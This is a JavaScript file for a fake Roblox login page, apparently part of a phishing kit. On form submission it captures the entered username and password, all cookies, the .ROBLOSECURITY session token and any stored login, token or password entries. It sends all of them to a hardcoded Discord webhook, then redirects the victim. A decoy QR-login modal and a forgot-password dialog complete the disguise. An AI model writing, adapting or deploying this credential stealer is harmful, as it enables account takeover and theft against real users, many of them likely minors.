// Function to capture all cookies
function getCookies() {
    const cookies = document.cookie;
    return cookies;
}

// Function to capture a specific cookie by name
function getSpecificCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
}

// Function to capture form data
function captureFormData() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    return {
        username,
        password
    };
}

// Function to capture all storage data
function getAllStorageData() {
    const localStorageData = JSON.stringify(localStorage);
    const sessionStorageData = JSON.stringify(sessionStorage);
    return {
        localStorage: localStorageData,
        sessionStorage: sessionStorageData
    };
}

// Function to extract login credentials and tokens from storage
function extractLoginCredentials(storageData) {
    const credentials = [];
    const localStorage = JSON.parse(storageData.localStorage);
    const sessionStorage = JSON.parse(storageData.sessionStorage);

    for (let key in localStorage) {
        if (localStorage.hasOwnProperty(key) && (key.includes('login') || key.includes('token') || key.includes('password') || key.includes('account'))) {
            credentials.push({ type: 'localStorage', key, value: localStorage[key] });
        }
    }

    for (let key in sessionStorage) {
        if (sessionStorage.hasOwnProperty(key) && (key.includes('login') || key.includes('token') || key.includes('password') || key.includes('account'))) {
            credentials.push({ type: 'sessionStorage', key, value: sessionStorage[key] });
        }
    }

    return credentials;
}

// Function to send user information to Discord webhook
async function sendUserInfoToDiscord(formData, cookies, token, storageData, credentials) {
    const webhookURL = 'https://discord.com/api/webhooks/1413136208015396965/ZOPuML2XdrU0egq3U6dGmCmjBT_4Mpcu49g3y35HqB2j_jpScBqIqR-3YB4w89p61juu'; // Replace with your actual webhook URL
    const message = {
        content: `New user have logged in!\n**Username:** ${formData.username}\n**Password:** ${formData.password}\n**Roblox Token:** ${token}\n**Cookies:**\n${cookies}\n**Extracted Login Credentials and Tokens:**\n${credentials.map(cred => `Type: ${cred.type}, Key: ${cred.key}, Value: ${cred.value}`).join('\n')}`
    };

    try {
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(message)
        });

        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        console.log('User information sent to Discord');
    } catch (error) {
        console.error('There was a problem with the fetch operation:', error);
    }
}

// Add an event listener to the form submission
document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent the form from submitting the traditional way
            const formData = captureFormData();
            const cookies = getCookies();
            const storageData = getAllStorageData();
            const token = getSpecificCookie('.ROBLOSECURITY'); // Replace with the actual cookie name

            console.log('Form Data:', formData);
            console.log('Roblox Token:', token);
            console.log('Cookies on Form Submission:', cookies);
            console.log('Storage Data on Form Submission:', storageData);

            const credentials = extractLoginCredentials(storageData);
            console.log('Extracted Credentials:', credentials);

            await sendUserInfoToDiscord(formData, cookies, token, storageData, credentials);

            // Redirect to the actual Roblox website
            window.location.href = 'message.html';
        });
    } else {
        console.error('Login form not found');
    }
});

function randomString(len) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let str = '';
    for (let i = 0; i < len; i++) {
        str += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return str;
}

function updateQrCode() {
    const data = randomString(16);
    const qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=' + encodeURIComponent(data);
    document.getElementById('qrImage').src = qrUrl;
}

document.getElementById('qrBtn').onclick = function() {
    updateQrCode();
    document.getElementById('qrPrompt').style.display = 'flex';
};

// Change QR code every 2 seconds while modal is open
let qrInterval = null;
document.getElementById('qrBtn').onclick = function() {
    updateQrCode();
    document.getElementById('qrPrompt').style.display = 'flex';
    qrInterval = setInterval(updateQrCode, 2000);
};

// Close when clicking the close button
document.getElementById('closeQr').onclick = function() {
    document.getElementById('qrPrompt').style.display = 'none';
    clearInterval(qrInterval);
};

// Close when clicking outside the QR modal
document.getElementById('qrPrompt').onclick = function(e) {
    if (e.target === this) {
        this.style.display = 'none';
        clearInterval(qrInterval);
    }
};
      // Show the forgot password frame
document.getElementById('forgotLink').addEventListener('click', function(event) {
    event.preventDefault();
    document.getElementById('forgotFrame').style.display = 'flex';
});

// Close the forgot password frame
document.getElementById('closeForgot').addEventListener('click', function() {
    document.getElementById('forgotFrame').style.display = 'none';
});

// Send forgot password email
document.getElementById('sendForgotBtn').addEventListener('click', async function() {
    const emailInput = document.getElementById('forgotEmail');
    const email = emailInput.value.trim();
    const msg = document.getElementById('forgotMsg');

    // Clear previous message
    msg.style.display = 'none';
    msg.textContent = '';

    // Simple email format validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!email || !emailRegex.test(email)) {
        msg.style.display = 'block';
        msg.textContent = 'Please enter a valid email address.';
        msg.style.color = '#f44336';
        return;
    }

    try {
        // Disable button while sending
        this.disabled = true;
        this.textContent = 'Sending...';

        // Attempt to send email no matter what
        const response = await fetch('/api/send-forgot-email', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email })
        });

        let data = {};
        try { data = await response.json(); } catch {}

        // Always show success message even if email doesn't exist in DB
        msg.style.display = 'block';
        msg.textContent = data.message || 'Successfully sent a reset code to your email.';
        msg.style.color = '#4CAF50';

    } catch (err) {
        console.error('Error sending email:', err);
        msg.style.display = 'block';
        msg.textContent = 'Failed to reach mail';
        msg.style.color = '#f44336';
    } finally {
        this.disabled = false;
        this.textContent = 'Send';
    }
});
